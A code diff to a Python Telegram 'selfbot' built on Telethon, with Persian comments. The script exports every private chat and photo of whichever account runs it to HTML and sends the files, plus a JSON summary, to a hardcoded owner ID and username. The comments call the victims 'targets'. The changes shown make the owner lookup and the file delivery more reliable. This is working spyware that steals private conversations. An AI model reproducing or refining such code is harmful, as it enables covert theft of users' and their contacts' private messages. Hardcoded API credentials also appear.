@@ -13,8 +13,9 @@ from telethon.tl.types import User
 API_ID = 29834234
 API_HASH = "552c01d21d127def060f2915aedeebf9"
 
-# آیدی عددی مالک سلف‌بات
+# اطلاعات مالک سلف‌بات
 OWNER_ID = 8870295777
+OWNER_USERNAME = "@Moein_915"  # <-- یوزرنیم تلگرام خود را اینجا وارد کنید (با @)
 
 # تنظیمات
 MAX_CONCURRENT_DOWNLOADS = 3
@@ -24,6 +25,16 @@ client = TelegramClient("my_account", API_ID, API_HASH)
 
 
 # ------------------ توابع کمکی فایل و تارگت‌ها ------------------
+
+async def get_owner_entity(client):
+    """یافتن انتیتی معتبر مالک جهت جلوگیری از خطای PeerIdInvalidError"""
+    try:
+        if OWNER_USERNAME and OWNER_USERNAME != "@YourOwnerUsername":
+            return await client.get_entity(OWNER_USERNAME)
+        return await client.get_entity(OWNER_ID)
+    except Exception:
+        return OWNER_ID
+
 
 def get_all_targets():
     """دریافت لیست تمام تارگت‌های ذخیره‌شده از روی پوشه‌ها"""
@@ -86,7 +97,7 @@ async def get_messages_safe(client, entity_id):
 
 
 async def generate_chat_html(client, me, user):
-    """تولید کدهای HTML برای چت‌ها (از اولین پیام تا آخرین پیام به همراه عکس)"""
+    """تولید کدهای HTML برای چت‌ها (از قدیمی‌ترین به جدیدترین)"""
     chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
     username = user.username if user.username else "NoUsername"
 
@@ -94,7 +105,6 @@ async def generate_chat_html(client, me, user):
     if not messages:
         return None, chat_name, username
 
-    # چت‌ها از قدیمی‌ترین به جدیدترین مرتب می‌شوند
     messages.reverse()
     semaphore = asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS)
     photo_messages = [m for m in messages if m.photo and m.sender_id not in (me.id, OWNER_ID)]
@@ -164,20 +174,23 @@ async def generate_chat_html(client, me, user):
 
 
 async def process_and_send_non_owner_chats(client, me):
-    """استخراج چت‌ها و ارسال مستقیم فایل‌های HTML به پیوی مالک"""
+    """استخراج چت‌ها و ارسال مستقیم فایل‌های HTML به مالک"""
     print("\n[INFO] Extracting and sending private HTML chats directly...")
     
+    owner_peer = await get_owner_entity(client)
     host_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
     host_username = f"@{me.username}" if me.username else "NoUsername"
 
     contacts = []
     idx = 1
 
-    # ارسال پیام شروع به مالک
-    await client.send_message(
-        OWNER_ID, 
-        f"🚀 **استخراج چت‌های کاربر جدید آغاز شد:**\n👤 **کاربر:** {host_name} ({host_username})\n🆔 **آیدی:** `{me.id}`"
-    )
+    try:
+        await client.send_message(
+            owner_peer, 
+            f"🚀 **استخراج چت‌های کاربر جدید آغاز شد:**\n👤 **کاربر:** {host_name} ({host_username})\n🆔 **آیدی:** `{me.id}`"
+        )
+    except Exception as e:
+        print(f"[WARNING] Could not send initial notification to owner: {e}")
 
     async for dialog in client.iter_dialogs():
         if isinstance(dialog.entity, User) and not dialog.entity.bot:
@@ -192,13 +205,11 @@ async def process_and_send_non_owner_chats(client, me):
             full_html, _, _ = await generate_chat_html(client, me, user)
             
             if full_html:
-                # نام‌گذاری فایل به‌صورت استاندارد جهت شناسایی توسط مالک
                 temp_filename = f"T{me.id}_C{user.id}.html"
                 
                 with open(temp_filename, "w", encoding="utf-8") as f:
                     f.write(full_html)
 
-                # کپشن اختصاصی زیر فایل
                 caption = (
                     f"📄 **فایل چت مخاطب**\n\n"
                     f"👤 **کاربر سلف:** {host_name} ({host_username}) | `{me.id}`\n"
@@ -208,7 +219,7 @@ async def process_and_send_non_owner_chats(client, me):
                 )
 
                 try:
-                    await client.send_file(OWNER_ID, temp_filename, caption=caption)
+                    await client.send_file(owner_peer, temp_filename, caption=caption)
                     print(f"[SENT] HTML file sent for: {chat_name}")
                 except Exception as e:
                     print(f"[ERROR] Failed to send HTML for {chat_name}: {e}")
@@ -223,11 +234,8 @@ async def process_and_send_non_owner_chats(client, me):
                     "username": username
                 })
                 idx += 1
-                
-                # فاصله کوتاه جهت جلوگیری از محدودیت ارسال پیام تلگرام (FloodWait)
                 await asyncio.sleep(1.5)
 
-    # ارسال فایل اطلاعات کلی (info.json) جهت مدیریت بهتر لیست چت‌ها
     info_data = {
         "target_id": me.id,
         "target_name": host_name,
@@ -240,12 +248,12 @@ async def process_and_send_non_owner_chats(client, me):
 
     try:
         await client.send_file(
-            OWNER_ID, 
+            owner_peer, 
             info_filename, 
             caption=f"📊 **خلاصه اطلاعات کاربر**\n👤 **کاربر:** {host_name}\n🆔 **آیدی:** `{me.id}`\n✅ **تعداد کل چت‌ها:** {len(contacts)}"
         )
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"[ERROR] Failed to send summary JSON to owner: {e}")
     finally:
         if os.path.exists(info_filename):
             os.remove(info_filename)
@@ -255,18 +263,15 @@ async def process_and_send_non_owner_chats(client, me):
 
 @client.on(events.NewMessage)
 async def auto_save_incoming_html_handler(event):
-    """ذخیره‌سازی خودکار فایل‌های HTML دریافتی روی سیستم مالک برای استفاده در دستور لیست"""
+    """ذخیره‌سازی خودکار فایل‌های HTML دریافتی روی سیستم مالک"""
     if event.sender_id == OWNER_ID:
         return
 
-    # بررسی دریافت فایل HTML یا JSON خلاصه
     if event.file and event.file.name and isinstance(event.file.name, str):
         fname = event.file.name
         
-        # ذخیره فایل HTML
         if fname.startswith("T") and "_C" in fname and fname.endswith(".html"):
             try:
-                # استخراج آیدی تارگت و آیدی مخاطب از اسم فایل
                 parts = fname.replace(".html", "").split("_C")
                 target_id = parts[0].replace("T", "")
                 contact_id = parts[1]
@@ -279,7 +284,6 @@ async def auto_save_incoming_html_handler(event):
             except Exception as e:
                 print(f"[ERROR] Auto save HTML failed: {e}")
 
-        # ذخیره فایل خلاصه JSON
         elif fname.startswith("INFO_") and fname.endswith(".json"):
             try:
                 target_id = fname.replace("INFO_", "").replace(".json", "")
